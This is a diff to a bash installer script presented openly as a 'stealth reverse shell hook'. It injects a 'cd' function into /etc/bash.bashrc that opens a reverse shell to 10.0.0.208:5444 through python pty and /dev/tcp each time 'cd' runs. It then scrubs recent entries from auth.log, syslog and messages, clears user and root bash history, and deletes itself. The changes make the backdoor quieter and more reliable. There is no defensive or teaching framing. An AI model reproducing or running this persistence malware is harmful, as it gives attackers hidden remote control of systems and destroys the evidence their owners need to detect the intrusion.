@@ -2,7 +2,7 @@
 
 # === Stealth Reverse Shell Hook for 'cd' ===
 # Reverse shell: 10.0.0.208:5444
-# Injects into /etc/bash.bashrc and erases its own traces afterward
+# Injects into /etc/bash.bashrc and clears logs/history + self-destructs
 
 HOOK_PORT=5444
 CALLBACK_IP="10.0.0.208"
@@ -16,23 +16,22 @@ if grep -q "# cd hook" "$TARGET_BASHRC"; then
     exit 0
 fi
 
-# Append stealth reverse shell function for 'cd'
-cat <<EOF >> "$TARGET_BASHRC"
+# Append the cleaned, silent reverse shell hook
+cat << 'EOF' >> "$TARGET_BASHRC"
 
 # cd hook
 cd() {
-  bash -c "python -c 'import pty; pty.spawn(\"/bin/bash\")' >& /dev/tcp/$CALLBACK_IP/$HOOK_PORT 0>&1" 2>/dev/null & disown
-  builtin cd "\$@"
+  builtin cd "$@" || return
+  if command -v python >/dev/null 2>&1; then
+    setsid bash -c "python -c 'import pty; pty.spawn(\"/bin/bash\")' >& /dev/tcp/10.0.0.208/5444 0>&1" </dev/null >/dev/null 2>&1 &
+  fi
 }
 EOF
 
 echo "[+] Hook injected into $TARGET_BASHRC"
 
-# === Stealth Measures ===
+# === Stealth Measures: Clean logs from last 10 minutes ===
 
-echo "[*] Dynamically scrubbing logs from the past 10 minutes..."
-
-# Get current time and 10 minutes ago as epoch
 now_epoch=$(date +%s)
 cutoff_epoch=$(date -d '10 minutes ago' +%s)
 
@@ -63,20 +62,17 @@ clean_log /var/log/auth.log
 clean_log /var/log/syslog
 clean_log /var/log/messages
 
-# Clear current session history
+# Clear shell history (optional)
 export HISTFILE=~/.bash_history
 history -c
 rm -f ~/.bash_history 2>/dev/null
 rm -f /root/.bash_history 2>/dev/null
 
-echo "[+] Log cleanup complete."
-
-# === Self-destruct the script after execution ===
-
-echo "[*] Self-destructing..."
+# === Self-destruct the installer ===
+echo "[*] Self-destructing script..."
 SCRIPT_PATH="$0"
 rm -f "$SCRIPT_PATH"
 unset SCRIPT_PATH
 history -d $(history 1) 2>/dev/null
 
-echo "[+] Script has removed itself."
+echo "[+] cd hook installed silently. Reverse shell will trigger with each use of 'cd'."
